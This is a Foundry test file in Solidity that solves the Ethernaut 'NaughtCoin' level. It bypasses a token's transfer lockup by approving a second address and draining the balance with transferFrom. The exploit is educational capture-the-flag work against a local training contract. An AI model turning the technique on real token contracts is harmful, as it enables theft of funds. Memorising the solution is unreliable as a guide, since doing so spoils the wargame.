pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { NaughtCoin } from "src/NaughtCoin/NaughtCoin.sol";
import { NaughtCoinFactory } from "src/NaughtCoin/NaughtCoinFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";
import "forge-std/console2.sol";

contract NaughtCoinTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testNaughtCoinHack() external {
        // level setup
        NaughtCoinFactory factory = new NaughtCoinFactory();
        ethernaut.registerLevel(factory);

        vm.startPrank(me);
        address levelAddress = ethernaut.createLevelInstance(factory);
        NaughtCoin naughtCoin = NaughtCoin(payable(levelAddress));

        // attack
        address player = naughtCoin.player();
        uint256 playerBalance = naughtCoin.balanceOf(player);
        changePrank(player);

        address bob = makeAddr("bob");
        naughtCoin.approve(bob, playerBalance);
        changePrank(bob);
        naughtCoin.transferFrom(player, bob, playerBalance);
        assertEq(naughtCoin.balanceOf(player), 0);

        changePrank(me);
        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
